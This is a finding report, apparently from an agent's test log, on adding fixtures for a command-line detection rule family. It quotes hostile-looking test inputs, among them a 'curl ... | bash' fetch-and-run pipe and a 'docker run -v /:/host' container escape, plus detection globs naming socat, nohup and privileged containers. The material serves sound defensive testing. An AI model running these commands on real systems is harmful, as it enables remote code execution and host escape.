# FINDING 2026-10-29 — the third rule family had never been asked a question

**Class:** test-design defect (coverage gap), with four engine/pack observations underneath
**Status:** OPEN — harness half CLOSED, pack gaps OPEN and Dad's call
**Instrument:** `scripts/argvfixture.py`
**Found:** beat 649, 2026-10-29

## What was missing

The rule pack matches on three glob-bearing predicate families:

| family | rules using it | fixtures before today | rows |
|---|---|---|---|
| `path_glob_any` | 4 | yes — `pathfixture.py` | 77 |
| `endpoint_glob_any` | 3 | yes — `endpointfixture.py` (beat 645) | 32 |
| `argv_any` | **7** | **none** | **0** |

`argv_any` is the family that decides whether a command line looks like an install
pipe, a persistence trick, an obfuscation, a privileged container, or a reverse
shell. It carries **more rules than either other family** and it had **zero
fixtures**. Nothing had ever asked it to fire, and nothing had ever asked it to
stay quiet.

This is the same shape as beat 645 (*"a family with no fixtures does not read as
untested, it reads as green"*). That beat found and fixed it for endpoints. I
fixed the family I was looking at and did not ask which other families existed.

## How it was missed for a week

I asked the wrong question first. My first pass compared the 20 rule ids against
the fixture files as substrings and got **"20 of 20 rules have no fixture"** —
because fixtures name *globs*, not rule ids. A grep that can only answer
"satisfied or not" cannot tell "no coverage" from "wrong unit of measurement".
The real answer is 7 rules have a glob predicate and 13 are matched on `type` /
`detail_equals` alone.

Before: 39 distinct `argv_any` globs, 0 rows. After: **39 globs, 100 rows, all
judged, 39 of 39 asked to say no.**

## What the fixtures found

Every one of these was **measured** through `packcheck.go_path_match` +
`match_one`, not predicted. Four of my predictions were wrong.

### 1. `*|sh*` does not fire on `| bash` — a live false negative

```
glob: *|sh*        command: curl -s https://x.tld/i | bash        result: False
```

The glob names only `sh`. The identical attack spelled with `bash`, `zsh`, or
`python` walks straight through a rule that exists to catch install-pipes.
Predicted `True`, measured `False`.

**Not mine to fix** — a pack or engine change is Dad's call. Recorded as it
behaves.

### 2. The contains fallback fires on prose, not just commands

`*disown*` vs `man disown` → **True**. `*--listen*` vs `grep --listen file` →
**True**. `*socat*` vs `man socat` → **True**. `*nohup*` vs
`grep -r nohup /usr/share/doc/` → **True**.

The matcher cannot distinguish a command from an argument or a sentence. Any
command line that merely *contains* the word fires the rule. Fourteen
declared-True lookalikes are pinned as a count so this false-positive budget is
an owned decision rather than an accident nobody looked at (beat 645).

### 3. `.bashrc.example` does not over-match — I assumed it would

```
*/.bashrc*        vs cat .bashrc.example        → False (predicted True)
*/.bash_profile*  vs cat .bash_profile.example  → False (predicted True)
*/.zshrc*         vs cat .zshrc.example         → False (predicted True)
```

After three findings all caused by over-matching, I predicted a fourth and was
wrong in the safe direction. The whole-path route is stricter than the
contains-fallback route and these land on the strict one. Worth recording
because "the matcher is too loose" had become my default hypothesis, and a
default hypothesis is how a fixture gets bent to fit a theory.

### 4. `*-v /:*` is correctly tight

`docker run -v /:/host` fires; `-v /tmp:/tmp` and `-v /data:/data` do not. The
nastiest container escape in the pack is matched precisely and the bounded
mounts are spared. Not every glob is broken.

## The structural check

The instrument now fails if **any** argv glob lacks a negative row:

```
ok("every argv glob is asked to match AND to not match
    (a glob never asked to say no is untested)")
```

This is the beat 641 check applied to the third family. It went red on first
run with **28 of 39 globs** having only positive rows, which is what forced the
negative half to be written rather than assumed.

## Proof the instrument can fail

- Mutate a pack glob (`*--privileged*` → `*--privileged-X*`) → `FAIL every
  distinct argv glob in the pack has at least one fixture (missing:
  ['*--privileged-X*'])`, **rc=1**. Control rc=0.
- Mutate a second glob (`*socat*` → `*ping*`) → **rc=1**.

A fixture set that has never seen its own pack change is a transcript, not a
test.

## Honest limits

All 100 rows are judged by `packcheck.go_path_match`, a **transcription** of Go's
`path.Match`, corroborated by a second independent port (`neargo`) — 0 rows
diverge between them. That is two people reading the same source carefully, not
Go itself. See `FINDING-2026-10-28-oracle-is-a-mirror.md`. **The Go toolchain
remains the only path to measurement and this host does not have it.**

## Wired in

Added to `suitecheck.sh` `SELFHARNESS`; `docsindex.py` regenerated; baseline
moved to **65 suites / 1442 checks**; `suitecheck_test.sh` M8's pinned control
count updated to match, so the cheap stub cases cannot drift away from the real
tree without something going red.
